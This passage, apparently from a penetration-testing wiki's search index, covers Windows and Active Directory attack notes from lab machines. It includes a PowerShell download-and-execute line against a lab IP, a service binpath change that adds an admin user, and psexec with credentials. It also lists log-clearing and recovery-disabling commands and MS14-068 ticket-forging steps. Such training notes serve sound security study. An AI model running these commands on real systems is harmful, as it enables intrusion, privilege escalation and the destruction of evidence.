ZIP"},{"location":"os/windows/0-cheatsheed/#view-file-systems","text":"gdr -PSProvider 'FileSystem'","title":"View File Systems"},{"location":"os/windows/0-cheatsheed/#access-shared-volume","text":"net use y: \\\\10.10.10.57\\c$ /user:administrator 1234test","title":"Access shared volume"},{"location":"os/windows/0-cheatsheed/#invoke-command-with-credentials","text":"$user = '.\\administrator'; $psw = '1234test'; $secpsw = ConvertTo-SecureString $psw -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpsw invoke-command -computername localhost -credential $credential -scriptblock {cd C:\\Users\\Administrator\\Desktop\\;C:\\Users\\Administrator\\Desktop\\root.exe}","title":"Invoke command with credentials"},{"location":"os/windows/0-cheatsheed/#alternate-data-stream","text":"Listing: dir /R Find Streams: \u200bget-item -path *.* -stream * Reading: \u200bpowershell Get-Content -Path \"hm.txt\" -Stream \"root.txt\" Reading: get-content backup.zip -stream 'pass' Reading: streams.exe /accepteula -s from sysinternals","title":"Alternate Data Stream"},{"location":"os/windows/0-cheatsheed/#msi","text":"","title":"MSI"},{"location":"os/windows/0-cheatsheed/#installing-msi","text":"msiexec /quiet /qn /i malicious.msi /quiet = Suppress any messages to the user during installation /qn = No GUI /i = Regular (vs. administrative) installation","title":"Installing MSI"},{"location":"os/windows/0-cheatsheed/#services","text":"Registry entries: HKLM\\SYSTEM\\CurrentControlSet\\Services View service properties: sc qc \"Vulnerable Service\" Restarting: sc stop \"Vulnerable Service\" Service information: Get-Service\u200b \u200b \"Ubiquiti UniFi Video\"\u200b | fl * Restart PC: shutdown /r /t 0 Change binary path: sc config \"Vulnerable Service\" binpath= \"net user eviladmin P4ssw0rd@ /add","title":"Services"},{"location":"os/windows/0-cheatsheed/#keep-alive","text":"When a service starts in Windows operating systems, it must communicate with the Service Control Manager . If it\u2019s not, Service Control Manager will terminates the process.","title":"Keep alive"},{"location":"os/windows/0-cheatsheed/#auto-save-password-to-powershell","text":"reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr DefaultUserName DefaultDomainName DefaultPassword \u200b$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)\u200b Start-Process -FilePath powershell -argumentlist IEX(New-Object Net.webClient).downloadString('http:// LAB IP /writeup') -Credential $creds","title":"Auto Save Password to PowerShell"},{"location":"os/windows/0-cheatsheed/#permissions","text":"whoami /priv","title":"Permissions"},{"location":"os/windows/0-cheatsheed/#view-permisions","text":"cacls C:\\Users\\Administrator\\Desktop\\root.txt","title":"View Permisions"},{"location":"os/windows/0-cheatsheed/#grant-permissions","text":"cacls C:\\Users\\Administrator\\Desktop\\root.txt /grant Alfred:F","title":"Grant Permissions"},{"location":"os/windows/0-cheatsheed/#ssh-from-windows-to-attacker-kali","text":"","title":"SSH from Windows to Attacker (Kali)"},{"location":"os/windows/0-cheatsheed/#manual","text":"From Windows: plink.exe -l root -pw -R 445:127.0.0.1:445 10.10.14.8 From Attacker: netstat -ano | grep 445 winexe -U Administrator //127.0.0.1 cmd.exe","title":"Manual"},{"location":"os/windows/0-cheatsheed/#metasploit","text":"portfwd add -l 445 -p 445 -r 127.0.0.1 use exploit/windows/smb/psexec set SMBDOMAIN CHATTERBOX set SMBUSER Administrators set SMBPASS Welcome1! set RHOST 127.0.0.1 exploit","title":"Metasploit"},{"location":"os/windows/active-directory/","text":"Active Directory Introduction Active Directory enables centralized, secure management of an entire network, which might span a building, a city, or multiple locations throughout the world. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10) Components https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10) Component Description Organizational Units Container object Used to arrange other objects Easier to locate and manage Can delegate the authority to manage Can be nested in other organizational units Domains Container object Collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains Each domain is an administrative boundary for objects. A single domain can span multiple physical locations or sites Domain Trees Collections of domains that are grouped together in hierarchical structures When you add a domain to a tree, it becomes a child of the tree root domain The domain to which a child domain is attached is called the parent domain. A child domain might in turn have its own child domain. The name of a child domain is combined with the name of its parent domain to form its own unique Domain Name System (DNS) name such as Corp.nwtraders.msft. .:. a tree has a contiguous namespace. Forests Instance of Active Directory Each forest acts as a top-level container in that it houses all domain containers for that particular Active Directory instance A forest can contain one or more domain container objects, all of which share a common logical structure, global catalog, directory schema, and directory configuration, as well as automatic two-way transitive trust relationships. The first domain in the forest is called the forest root domain . The name of that domain refers to the forest, such as Nwtraders.msft. By default, information in Active Directory is shared only within the forest. .:. the forest is a security boundary for the information that is contained in that instance of Active Directory Site Objects Leaf and container objects Topmost object in the hierarchy of objects that are used to manage and implement Active Directory replication Stores the hierarchy of objects that are used by the Knowledge Consistency Checker (KCC) to effect the replication topology Some of the objects located in: NTDS Site Settings objects , subnet objects , connection objects , server objects , and site objects (one site object for each site in the forest) Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10) Schema - Defines objects and attributes Query and index mechanism - Ability to search and publish objects and properties Global Catalog - Contains info about every object in directory Replication Service - Distributes information across domain controller Detect Firewall Blocking AD PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009 * Run the \u201cDomains Trusts\u201d option between DCs, or between DCs and any machine * \u201cNOTLISTENING,\u201d 0x00000001, and 0x00000002, that means there is a port block * Can ignore UDP 389 and UDP 88 messages * TCP 42 errors, that just means WINS is not running on the target server https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/ Implementing Least Privilege Model https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models Scanning pingcastle.exe --healthcheck --server DOMAIN_CONTROLLER_IP --user USERNAME --password PASSWORD --advanced-live --nullsession Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be Tools ldapsearch Query the Domain Controller for Active Directory UserAccountControl attributes of active accounts Other specific configurations Possible UserAccountControl values: https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro Active users (2 == disabled account status) ldapsearch -x -h $ip -p 389 -D 'SVC_TGS'\u200b -w \u200b$password -b \u200b dc=active,dc=htb \u200b -s sub ( (objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))) \u200b samaccountname Impacket\u2019s GetADUsers.py Enumerate domain user accounts GetADUsers.py -all active.htb/svc_tgs -dc-ip $ip Attack Patterns Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Escalating privileges with ACLs in Active Directory: https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ Defense Active Directory Core Security Principles Best Practices: https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf Active Directory Kill Chain Attack Defense: https://github.com/infosecn1nja/AD-Attack-Defense Microsoft-Blue-Forest: https://github.com/rootsecdev/Microsoft-Blue-Forest Welcome to building your first domain controller!: https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md Pwn and Defend - Active Directory Domain Enumeration: https://www.youtube.com/watch?v=YxeXfHkHAUI feature=youtu.be","title":"Active Directory"},{"location":"os/windows/active-directory/#active-directory","text":"","title":"Active Directory"},{"location":"os/windows/active-directory/#introduction","text":"Active Directory enables centralized, secure management of an entire network, which might span a building, a city, or multiple locations throughout the world. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10)","title":"Introduction"},{"location":"os/windows/active-directory/#components","text":"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10) Component Description Organizational Units Container object Used to arrange other objects Easier to locate and manage Can delegate the authority to manage Can be nested in other organizational units Domains Container object Collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains Each domain is an administrative boundary for objects. A single domain can span multiple physical locations or sites Domain Trees Collections of domains that are grouped together in hierarchical structures When you add a domain to a tree, it becomes a child of the tree root domain The domain to which a child domain is attached is called the parent domain. A child domain might in turn have its own child domain. The name of a child domain is combined with the name of its parent domain to form its own unique Domain Name System (DNS) name such as Corp.nwtraders.msft. .:. a tree has a contiguous namespace. Forests Instance of Active Directory Each forest acts as a top-level container in that it houses all domain containers for that particular Active Directory instance A forest can contain one or more domain container objects, all of which share a common logical structure, global catalog, directory schema, and directory configuration, as well as automatic two-way transitive trust relationships. The first domain in the forest is called the forest root domain . The name of that domain refers to the forest, such as Nwtraders.msft. By default, information in Active Directory is shared only within the forest. .:. the forest is a security boundary for the information that is contained in that instance of Active Directory Site Objects Leaf and container objects Topmost object in the hierarchy of objects that are used to manage and implement Active Directory replication Stores the hierarchy of objects that are used by the Knowledge Consistency Checker (KCC) to effect the replication topology Some of the objects located in: NTDS Site Settings objects , subnet objects , connection objects , server objects , and site objects (one site object for each site in the forest) Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10) Schema - Defines objects and attributes Query and index mechanism - Ability to search and publish objects and properties Global Catalog - Contains info about every object in directory Replication Service - Distributes information across domain controller","title":"Components"},{"location":"os/windows/active-directory/#detect-firewall-blocking-ad","text":"PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009 * Run the \u201cDomains Trusts\u201d option between DCs, or between DCs and any machine * \u201cNOTLISTENING,\u201d 0x00000001, and 0x00000002, that means there is a port block * Can ignore UDP 389 and UDP 88 messages * TCP 42 errors, that just means WINS is not running on the target server https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/","title":"Detect Firewall Blocking AD"},{"location":"os/windows/active-directory/#implementing-least-privilege-model","text":"https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models","title":"Implementing Least Privilege Model"},{"location":"os/windows/active-directory/#scanning","text":"pingcastle.exe --healthcheck --server DOMAIN_CONTROLLER_IP --user USERNAME --password PASSWORD --advanced-live --nullsession Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be","title":"Scanning"},{"location":"os/windows/active-directory/#tools","text":"","title":"Tools"},{"location":"os/windows/active-directory/#ldapsearch","text":"Query the Domain Controller for Active Directory UserAccountControl attributes of active accounts Other specific configurations Possible UserAccountControl values: https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro Active users (2 == disabled account status) ldapsearch -x -h $ip -p 389 -D 'SVC_TGS'\u200b -w \u200b$password -b \u200b dc=active,dc=htb \u200b -s sub ( (objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))) \u200b samaccountname","title":"ldapsearch"},{"location":"os/windows/active-directory/#impackets-getaduserspy","text":"Enumerate domain user accounts GetADUsers.py -all active.htb/svc_tgs -dc-ip $ip","title":"Impacket\u2019s GetADUsers.py"},{"location":"os/windows/active-directory/#attack-patterns","text":"Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Escalating privileges with ACLs in Active Directory: https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/","title":"Attack Patterns"},{"location":"os/windows/active-directory/#defense","text":"Active Directory Core Security Principles Best Practices: https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf Active Directory Kill Chain Attack Defense: https://github.com/infosecn1nja/AD-Attack-Defense Microsoft-Blue-Forest: https://github.com/rootsecdev/Microsoft-Blue-Forest Welcome to building your first domain controller!: https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md Pwn and Defend - Active Directory Domain Enumeration: https://www.youtube.com/watch?v=YxeXfHkHAUI feature=youtu.be","title":"Defense"},{"location":"os/windows/api/","text":"Windows API Network Related ARP Table GetIPNetTable Services Change Services ChangeServiceConfigW","title":"Windows API"},{"location":"os/windows/api/#windows-api","text":"","title":"Windows API"},{"location":"os/windows/api/#network-related","text":"","title":"Network Related"},{"location":"os/windows/api/#arp-table","text":"GetIPNetTable","title":"ARP Table"},{"location":"os/windows/api/#services","text":"","title":"Services"},{"location":"os/windows/api/#change-services","text":"ChangeServiceConfigW","title":"Change Services"},{"location":"os/windows/events/","text":"Events Tools EtwExplorer View Event Tracing for Windows (ETW) Provider manifests GitHub: https://github.com/zodiacon/EtwExplorer","title":"Events"},{"location":"os/windows/events/#events","text":"","title":"Events"},{"location":"os/windows/events/#tools","text":"","title":"Tools"},{"location":"os/windows/events/#etwexplorer","text":"View Event Tracing for Windows (ETW) Provider manifests GitHub: https://github.com/zodiacon/EtwExplorer","title":"EtwExplorer"},{"location":"os/windows/hyperv/","text":"HyperV References Fuzzing para-virtualized devices in Hyper-V: https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/ Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 1: WDF: http://www.alex-ionescu.com/?p=377 Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 2 : Hypercalls MDLs: http://www.alex-ionescu.com/?p=471 https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/ https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/ https://github.com/comaeio/LiveCloudKd","title":"HyperV"},{"location":"os/windows/hyperv/#hyperv","text":"","title":"HyperV"},{"location":"os/windows/hyperv/#references","text":"Fuzzing para-virtualized devices in Hyper-V: https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/ Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 1: WDF: http://www.alex-ionescu.com/?p=377 Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 2 : Hypercalls MDLs: http://www.alex-ionescu.com/?p=471 https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/ https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/ https://github.com/comaeio/LiveCloudKd","title":"References"},{"location":"os/windows/important-endpoints/","text":"Important Endpoints Connection endpoints for Windows 10 https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints","title":"Important Endpoints"},{"location":"os/windows/important-endpoints/#important-endpoints","text":"","title":"Important Endpoints"},{"location":"os/windows/important-endpoints/#connection-endpoints-for-windows-10","text":"https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints","title":"Connection endpoints for Windows 10"},{"location":"os/windows/important-files/","text":"Important Files Collections Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ li, https://github.com/LOLBAS-Project/LOLBAS Version information sysinfo Windows 7+: /windows/system32/license.rtf /windows/system32/eula.txt Update Download locations C:\\Windows\\SoftwareDistribution\\Download wbadmin / ntbackup https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface. Delete any recovery catalogs: cmd.exe /c wbadmin.exe delete catalog -quiet BCDEdit https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings. Usable to creating new stores, modifying existing stores, adding boot menu options, and so on. Windows recovery console does not attempt to repair anything: cmd.exe /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no wevtutil https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. Clear System and Security logs: cmd.exe /c wevtutil.exe cl System cmd.exe /c wevtutil.exe cl Security DUMPBIN https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017 Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs). HTA Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a \"fully trusted\" application. Prefetch Files Created AT.EXE (scheduled jobs/tasks) SCHTASKS.EXE (scheduled jobs/tasks) CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. ) NET.EXE (net view, etc.) NET1.EXE (net use) NETSTAT.EXE (netstat -ano) REG.EXE (reg query and reg add) SC.EXE (interact with services) SYSTEMINFO.EXE (system profiling) TASKKILL.EXE (kill running processes) TASKLIST.EXE (tasklist /v) POWERSHELL.EXE (interact with powershell) NBTSTAT.EXE (profile) XCOPY.EXE (copy files around) NSLOOKUP.EXE (profile) QUSER.EXE (profile) RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip) PING.EXE (check connectivity) FTP.EXE (download/upload) Various Sysinternal tools (Psexec, sdelete, etc.) BITSADMIN.EXE (download/upload) ROUTE.EXE (adding persistent routes) REGSVR32.EXE (services) MAKECAB.EXE (compression before exfil) Originally form: http://www.sysforensics.org/2014/01/lateral-movement/. Link is no longer working Runonce.exe, msdt.exe, Openwith.exe https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636 sethc.exe (Sticky keys) By replacing the \u201cSticky Keys\u201d binary, C:\\Windows\\System32\\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. \u201cSticky Keys\u201d is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates \u201cSticky Keys\u201d and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication).","title":"Important Files"},{"location":"os/windows/important-files/#important-files","text":"","title":"Important Files"},{"location":"os/windows/important-files/#collections","text":"Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ li, https://github.com/LOLBAS-Project/LOLBAS","title":"Collections"},{"location":"os/windows/important-files/#version-information","text":"sysinfo Windows 7+: /windows/system32/license.rtf /windows/system32/eula.txt","title":"Version information"},{"location":"os/windows/important-files/#update-download-locations","text":"C:\\Windows\\SoftwareDistribution\\Download","title":"Update Download locations"},{"location":"os/windows/important-files/#wbadmin-ntbackup","text":"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface. Delete any recovery catalogs: cmd.exe /c wbadmin.exe delete catalog -quiet","title":"wbadmin / ntbackup"},{"location":"os/windows/important-files/#bcdedit","text":"https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings. Usable to creating new stores, modifying existing stores, adding boot menu options, and so on. Windows recovery console does not attempt to repair anything: cmd.exe /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no","title":"BCDEdit"},{"location":"os/windows/important-files/#wevtutil","text":"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. Clear System and Security logs: cmd.exe /c wevtutil.exe cl System cmd.exe /c wevtutil.exe cl Security","title":"wevtutil"},{"location":"os/windows/important-files/#dumpbin","text":"https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017 Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs).","title":"DUMPBIN"},{"location":"os/windows/important-files/#hta","text":"Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a \"fully trusted\" application.","title":"HTA"},{"location":"os/windows/important-files/#prefetch-files-created","text":"AT.EXE (scheduled jobs/tasks) SCHTASKS.EXE (scheduled jobs/tasks) CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. ) NET.EXE (net view, etc.) NET1.EXE (net use) NETSTAT.EXE (netstat -ano) REG.EXE (reg query and reg add) SC.EXE (interact with services) SYSTEMINFO.EXE (system profiling) TASKKILL.EXE (kill running processes) TASKLIST.EXE (tasklist /v) POWERSHELL.EXE (interact with powershell) NBTSTAT.EXE (profile) XCOPY.EXE (copy files around) NSLOOKUP.EXE (profile) QUSER.EXE (profile) RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip) PING.EXE (check connectivity) FTP.EXE (download/upload) Various Sysinternal tools (Psexec, sdelete, etc.) BITSADMIN.EXE (download/upload) ROUTE.EXE (adding persistent routes) REGSVR32.EXE (services) MAKECAB.EXE (compression before exfil) Originally form: http://www.sysforensics.org/2014/01/lateral-movement/. Link is no longer working","title":"Prefetch Files Created"},{"location":"os/windows/important-files/#runonceexe-msdtexe-openwithexe","text":"https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636","title":"Runonce.exe, msdt.exe, Openwith.exe"},{"location":"os/windows/important-files/#sethcexe-sticky-keys","text":"By replacing the \u201cSticky Keys\u201d binary, C:\\Windows\\System32\\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. \u201cSticky Keys\u201d is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates \u201cSticky Keys\u201d and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication).","title":"sethc.exe (Sticky keys)"},{"location":"os/windows/important-issues/","text":"Exploits IIS MS16-143 / CVE-2017-7269 - Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2. Allows remote code execution. Via a long header beginning with \"If: http://\" in a PROPFIND request. Exploits: - https://www.exploit-db.com/exploits/41738 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269 - https://github.com/edwardz246003/IIS_exploit - exploit/windows/iis/iis_webdav_scstoragepathfromurl References: - 0patching the \"Immortal\" CVE-2017-7269 SMB MS17-010 - EternalBlue SMB Remote Windows Kernel Pool Corruption Vista SP2, 2008 SP2, 7 SP1, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10, 2016 CVE-2017-0143 to CVE-2017-0148 Exploit: - https://github.com/worawit/MS17-010 - https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - exploit/windows/smb/ms17_010_eternalblue References: - https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/ - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/ Other (Local) MS17-013 - Microsoft Graphics Componen Vista SP2, 2008 SP2, 7 SP1, 2008 R2, RT 8.1, 10, 2016, Exploit: - https://www.exploit-db.com/exploits/41656 References: MS10-061 - Windows Printer Spooler (Stuxnet) XP SP2/SP3, 2003 SP2, Vista SP1/SP2, 2008, 7, 2008 R2 Execute code with SYSTEM privilege if a printer is shared on the network (patched September 2010) Making DCE RPC request to the StartDocPrinter procedure (notifies the spooler that a new job arrived) Impersonate the Printer Spooler service (spoolsv.exe) to create a file (from working dir: %SystemRoot%\\system32 ) Sending WritePrinter requests, an attacker can fully control the content of the created file Gain code execution by writing to a directory used by WMI to deploy applications Wbem\\Mof is periodically scanned and any new .mof files References: - http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html - os/windows/wmi.md Privilege Escalation Exploits MS16-032 - Secondary Logon to Address Elevation of Privilege Win7-Win10 2008-2012 - 32/64 bit Machine must have 2+ CPU cores Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032 - http://willgenovese.com/ms16-032-one-liners/ - ms16_032_secondary_logon_handle_privesc References: - https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html MS11-080 - Ancillary Function Driver (AfdJoinLeaf) XP, 2003 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080 - https://www.exploit-db.com/exploits/18176 - https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html python py installer module python pyinsaller.py --onefile example.py MS12-042 - Windows Kernel - SYSRET XP SP3, 2003, 7, 2008 R2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042 - https://www.exploit-db.com/exploits/20861 MS15-051 - Windows Kernel-Mode Drivers (client_copy_image) 2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 - https://www.exploit-db.com/exploits/37049 - https://github.com/hfiref0x/CVE-2015-1701 - exploit/windows/local/ms15_051_client_copy_image References: - https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html MS10-092 - Task Scheduler Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092 - exploit/windows/local/ms10_092_schelevator References: - https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092 - http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf MS14-058 - TrackPopupMenu Win32k NULL Pointer Dereference 2003, Vista, 2008, 2008 R2, 8, 8.1, 2012, 2012 R2, RT, RT 8.1, Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058 - exploit/windows/local/ms14_058_track_popup_menu References: - https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/ - https://www.freebuf.com/articles/system/50110.html MS14-070 - tcpip!SetAddrOptions NULL Pointer Dereference 2003 SP2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070 - exploit/windows/local/ms14_070_tcpip_ioctl References: - https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev - https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt bypassuac_eventvwr MS10-015 - Kitrap0d MS14-068 - Kerberos Domain Privilege Escalation Exploits: - Python Kerberos Exploitation Kit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek apt-get install krb5-user cifs-utils rdate # Add proper nameservers in /etc/hosts /etc/krb5.conf [libdefaults] default_realm = HTB.LOCAL # The following krb5.conf variables are only for MIT Kerberos. kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true #Edit the realms entry as follows: [realms] LAB.LOCAL = { kdc = mantis.htb.local:88 admin_server = mantis.htb.local default_domain = HTB.LOCAL } #Also edit the final section: [domain_realm] .domain.internal = HTB.LOCAL domain.internal = HTB.LOCAL net time -S 10.10.10.52 -U # Set local time accordingly # OR USE rdate -n 10.10.10.52 python ms14-068.py -u james@htb.local -d mantis.htb.local -p J@m3s_P@ssW0rd! -s S-1-5-21-4220043660-4019079961-2895681657 Rename the generated ticket to \u200b /tmp/krb5cc_0\u200b mv TGT_James@HTB.local.ccache /tmp/krb5cc_0 With Impacket (Golden PAC module): - kinit james (options ?) - klist (options ?) - \u200b python goldenPac.py htb.local/james@mantis.htb.local \u200b - Entering the password for the \u200b james \u200b user Manually: smbclient -W HTB.LOCAL //MANTIS/c$ -k References: - Additional information about CVE-2014-6324 - Attack Methods for Gaining Domain Admin Rights in Active Directory - HTB - Mantis CVE-2017-0213 - COM Aggregate Marshaler/IRemUnknown2 Type Confusion Privilege Escalation 10, 7, 8.1, 2008, 2008 R2, 2012, 2012 R2, 2016 When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP. Exploit: - https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 References: - https://bugs.chromium.org/p/project-zero/issues/detail?id=1107 - https://www.exploit-db.com/exploits/42020","title":"Important issues"},{"location":"os/windows/important-issues/#exploits","text":"","title":"Exploits"},{"location":"os/windows/important-issues/#iis","text":"","title":"IIS"},{"location":"os/windows/important-issues/#ms16-143-cve-2017-7269-","text":"Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2. Allows remote code execution. Via a long header beginning with \"If: http://\" in a PROPFIND request. Exploits: - https://www.exploit-db.com/exploits/41738 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269 - https://github.com/edwardz246003/IIS_exploit - exploit/windows/iis/iis_webdav_scstoragepathfromurl References: - 0patching the \"Immortal\" CVE-2017-7269","title":"MS16-143 / CVE-2017-7269 -"},{"location":"os/windows/important-issues/#smb","text":"","title":"SMB"},{"location":"os/windows/important-issues/#ms17-010-eternalblue-smb-remote-windows-kernel-pool-corruption","text":"Vista SP2, 2008 SP2, 